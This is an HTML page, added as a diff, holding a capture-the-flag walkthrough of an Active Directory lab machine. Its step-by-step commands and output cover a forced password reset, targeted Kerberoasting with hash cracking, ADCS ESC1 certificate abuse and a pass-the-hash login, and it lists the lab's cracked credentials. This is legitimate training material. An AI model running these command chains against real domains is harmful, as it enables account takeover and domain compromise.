@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Arasaka - HackSmarter Labs CTF Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of Arasaka machine from HackSmarter Labs. Learn Active Directory exploitation including Forced Password Change, Targeted Kerberoasting, and ADCS ESC1 attacks." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Arasaka CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta property="og:description" content="Active Directory exploitation walkthrough covering Forced Password Change, Targeted Kerberoasting, and ADCS ESC1 vulnerability for domain privilege escalation." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/arasaka/bloodhound-forcechangepassword.png" />
+  <meta property="og:url" content="https://z3rotrace.live/writeups/arasaka.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Arasaka CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta name="twitter:description" content="Active Directory exploitation walkthrough covering Forced Password Change, Targeted Kerberoasting, and ADCS ESC1 vulnerability for domain privilege escalation." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/arasaka/bloodhound-forcechangepassword.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Credentials table styling */
+    .credentials-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .credentials-table th,
+    .credentials-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
+    }
+
+    .credentials-table th {
+      background: rgba(0, 170, 255, 0.08);
+      color: #00aaff;
+      font-weight: 600;
+    }
+
+    .credentials-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .credentials-table code {
+      background: #161b22;
+      color: #ff8787;
+      padding: 0.15em 0.35em;
+      border-radius: 3px;
+      font-size: 0.85em;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain pre {
+      background: transparent;
+      border: none;
+      box-shadow: none;
+      margin: 0;
+      padding: 0.5rem 0;
+    }
+
+    .attack-chain pre code {
+      color: #c9d1d9;
+      font-size: 0.9rem;
+      line-height: 1.8;
+    }
+
+    /* Tool list styling */
+    .tools-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .tools-table th,
+    .tools-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
+    }
+
+    .tools-table th {
+      background: rgba(0, 170, 255, 0.08);
+      color: #00aaff;
+      font-weight: 600;
+    }
+
+    .tools-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    /* Key finding callout */
+    .key-finding {
+      background: rgba(255, 107, 107, 0.08);
+      border-left: 4px solid #ff6b6b;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .key-finding strong {
+      color: #ff6b6b;
+    }
+
+    /* Lessons learned styling */
+    .lessons-learned li {
+      margin-bottom: 0.75rem;
+    }
+
+    /* References styling */
+    .references li {
+      margin-bottom: 0.5rem;
+    }
+
+    .references a {
+      color: #00aaff;
+    }
+
+    .references a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="arasaka.html" aria-current="page">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <ul class="submenu" hidden>
+          <li><a href="../walkthroughs/sharethepain.html">ShareThePain</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Arasaka - HackSmarter Labs CTF Walkthrough</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Medium</li>
+      <li><strong>Target IP:</strong> 10.1.61.68</li>
+      <li><strong>Domain:</strong> hacksmarter.local</li>
+      <li><strong>Key Topics:</strong> Active Directory, Forced Password Change, Targeted Kerberoasting, ADCS ESC1</li>
+    </ul>
+  </div>
+
+  <h3>Summary</h3>
+  <p>This machine focuses on Active Directory exploitation through a chain of privilege escalation techniques. Starting with a service account that has the ability to force password changes, I pivoted through Kerberoasting to eventually exploit an ADCS ESC1 misconfiguration for domain privilege escalation.</p>
+
+  <h2>Credentials Obtained</h2>
+
+  <table class="credentials-table">
+    <thead>
+      <tr>
+        <th>Username</th>
+        <th>Password/Hash</th>
+        <th>Source</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>alt.svc</code></td>
+        <td><code>babygirl1</code></td>
+        <td>Initial Access</td>
+      </tr>
+      <tr>
+        <td><code>yorinobu</code></td>
+        <td><code>hacksmarter123</code></td>
+        <td>Forced Password Change</td>
+      </tr>
+      <tr>
+        <td><code>soulkiller.svc</code></td>
+        <td><code>MYpassword123#</code></td>
+        <td>Kerberoasting</td>
+      </tr>
+      <tr>
+        <td><code>the_emperor</code></td>
+        <td><code>d87640b0d83dc7f90f5f30bd6789b133</code> (NT hash)</td>
+        <td>ADCS ESC1</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Exploitation Chain</h2>
+
+  <h3><span class="step">[Step 1]</span> Forcing a Password Change on Yorinobu</h3>
+  <p>With the <code>alt.svc</code> account, I identified that this user has the <code>ForceChangePassword</code> permission over the <code>YORINOBU</code> account. This allowed me to reset the user's password without knowing the current one.</p>
+
+  <div class="question">
+    <strong>What is ForceChangePassword?</strong>
+  </div>
+  <div class="answer">
+    <p>This is an Active Directory permission that allows a user to reset another user's password without knowing the original. It is often misconfigured on service accounts and can be discovered using tools like BloodHound.</p>
+  </div>
+
+  <p><img src="../assets/arasaka/bloodhound-forcechangepassword.png" alt="BloodHound showing ForceChangePassword relationship between alt.svc and yorinobu" loading="lazy"></p>
+
+  <p>I used <code>net rpc</code> to force the password change:</p>
+  <pre><code>$ net rpc password "YORINOBU" -U "hacksmarter.local/alt.svc" -S "10.1.61.68"
+Enter new password for YORINOBU:
+Password for [HACKSMARTER.LOCAL\alt.svc]:</code></pre>
+
+  <p>I set the new password to <code>hacksmarter123</code> and verified the credentials worked:</p>
+  <pre><code>$ nxc smb hacksmarter.local -u yorinobu -p 'hacksmarter123'</code></pre>
+
+  <pre><code>SMB         10.1.61.68      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)
+SMB         10.1.61.68      445    DC01             [+] hacksmarter.local\yorinobu:hacksmarter123</code></pre>
+
+  <p>The <code>[+]</code> confirms successful authentication.</p>
+
+  <h3><span class="step">[Step 2]</span> Targeted Kerberoasting</h3>
+  <p>With access to the <code>yorinobu</code> account, I performed targeted Kerberoasting against the <code>soulkiller.svc</code> service account.</p>
+
+  <div class="question">
+    <strong>What is Targeted Kerberoasting?</strong>
+  </div>
+  <div class="answer">
+    <p>Unlike standard Kerberoasting which requests TGS tickets for all SPNs in the domain, targeted Kerberoasting focuses on specific accounts. This is useful when you have write permissions to set an SPN on a target account, or when you want to avoid detection by limiting your requests.</p>
+  </div>
+
+  <pre><code>$ targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'hacksmarter123'</code></pre>
+
+  <p>The tool retrieved a Kerberos TGS ticket for the <code>soulkiller.svc</code> account. I cracked the hash using hashcat:</p>
+  <pre><code>$ hashcat -m 13100 soulkiller.hash /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <div class="key-finding">
+    <strong>Cracked password:</strong> <code>MYpassword123#</code>
+  </div>
+
+  <h3><span class="step">[Step 3]</span> Enumerating ADCS Vulnerabilities</h3>
+  <p>With the <code>soulkiller.svc</code> credentials, I used Certipy to enumerate Active Directory Certificate Services for vulnerable certificate templates:</p>
+
+  <pre><code>$ certipy find -u soulkiller.svc@hacksmarter.local -p 'MYpassword123#' -dc-ip 10.1.61.68 -vulnerable</code></pre>
+
+  <pre><code>Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'hacksmarter-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'hacksmarter-DC01-CA'
+[*] Saving text output to '20251214050149_Certipy.txt'
+[*] Wrote text output to '20251214050149_Certipy.txt'
+[*] Saving JSON output to '20251214050149_Certipy.json'
+[*] Wrote JSON output to '20251214050149_Certipy.json'</code></pre>
+
+  <p>The results revealed a critical vulnerability in the <code>AI_Takeover</code> template:</p>
+
+  <pre><code>[+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
+[!] Vulnerabilities
+  ESC1                              : Enrollee supplies subject and template allows client authentication.</code></pre>
+
+  <div class="question">
+    <strong>What is ESC1?</strong>
+  </div>
+  <div class="answer">
+    <p>ESC1 is an ADCS misconfiguration where a certificate template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN). Combined with client authentication capabilities, an attacker can request a certificate for any user, including Domain Admins, and use it to authenticate as that user.</p>
+  </div>
+
+  <h3><span class="step">[Step 4]</span> Exploiting ESC1 for Privilege Escalation</h3>
+  <p>The vulnerable template <code>AI_Takeover</code> allows <code>soulkiller.svc</code> to request certificates with arbitrary UPNs. I requested a certificate for <code>the_emperor</code>, a high-privileged account:</p>
+
+  <pre><code>$ certipy req -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.61.68 \
+    -ca hacksmarter-DC01-CA -target 'DC01.hacksmarter.local' \
+    -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local'</code></pre>
+
+  <pre><code>Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 3
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'the_emperor@hacksmarter.local'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'the_emperor.pfx'
+[*] Wrote certificate and private key to 'the_emperor.pfx'</code></pre>
+
+  <p>With the certificate saved as <code>the_emperor.pfx</code>, I authenticated to obtain a TGT and the user's NT hash:</p>
+
+  <pre><code>$ certipy auth -pfx the_emperor.pfx -dc-ip 10.1.61.68</code></pre>
+
+  <pre><code>Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'the_emperor@hacksmarter.local'
+[*] Using principal: 'the_emperor@hacksmarter.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'the_emperor.ccache'
+[*] Wrote credential cache to 'the_emperor.ccache'
+[*] Trying to retrieve NT hash for 'the_emperor'
+[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133</code></pre>
+
+  <div class="question">
+    <strong>What is an NT Hash?</strong>
+  </div>
+  <div class="answer">
+    <p>The NT hash (also called NTLM hash) is a cryptographic representation of a Windows password. Unlike a plaintext password, it can be used directly for authentication through pass-the-hash attacks, making it just as valuable as the password itself.</p>
+  </div>
+
+  <h2>Proof</h2>
+
+  <div class="key-finding">
+    <strong>the_emperor NT Hash:</strong> <code>d87640b0d83dc7f90f5f30bd6789b133</code>
+  </div>
+
+  <p>The NT hash can be used for pass-the-hash attacks to authenticate as <code>the_emperor</code> without knowing the plaintext password:</p>
+  <pre><code>$ nxc smb 10.1.61.68 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'</code></pre>
+
+  <h2>Attack Chain Summary</h2>
+
+  <div class="attack-chain">
+    <pre><code>alt.svc (initial access)
+    |
+    | ForceChangePassword
+    v
+yorinobu (password reset to hacksmarter123)
+    |
+    | Targeted Kerberoasting
+    v
+soulkiller.svc (cracked: MYpassword123#)
+    |
+    | ESC1 - Certificate with arbitrary SAN
+    v
+the_emperor (obtained NT hash via certificate authentication)</code></pre>
+  </div>
+
+  <h2>Tools Used</h2>
+
+  <table class="tools-table">
+    <thead>
+      <tr>
+        <th>Tool</th>
+        <th>Purpose</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>net rpc</strong></td>
+        <td>SMB password operations</td>
+      </tr>
+      <tr>
+        <td><strong>NetExec (nxc)</strong></td>
+        <td>SMB authentication validation</td>
+      </tr>
+      <tr>
+        <td><strong>targetedKerberoast.py</strong></td>
+        <td>Targeted Kerberoasting attacks</td>
+      </tr>
+      <tr>
+        <td><strong>Certipy</strong></td>
+        <td>ADCS enumeration and exploitation</td>
+      </tr>
+      <tr>
+        <td><strong>hashcat</strong></td>
+        <td>Password hash cracking</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Key Takeaways</h2>
+
+  <div class="answer lessons-learned">
+    <ul>
+      <li><strong>ForceChangePassword</strong> permissions on service accounts are a common AD misconfiguration that can lead to lateral movement</li>
+      <li><strong>Targeted Kerberoasting</strong> is stealthier than requesting all SPNs and should be considered when specific accounts are identified</li>
+      <li><strong>ADCS ESC1</strong> remains one of the most impactful AD certificate vulnerabilities, often leading to domain compromise</li>
+      <li>Always enumerate certificate templates with Certipy when testing AD environments</li>
+    </ul>
+  </div>
+
+  <h2>References</h2>
+
+  <ul class="references">
+    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy Documentation</a></li>
+    <li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf" target="_blank" rel="noopener">SpecterOps - Certified Pre-Owned</a></li>
+    <li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation" target="_blank" rel="noopener">HackTricks - ADCS Attacks</a></li>
+  </ul>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
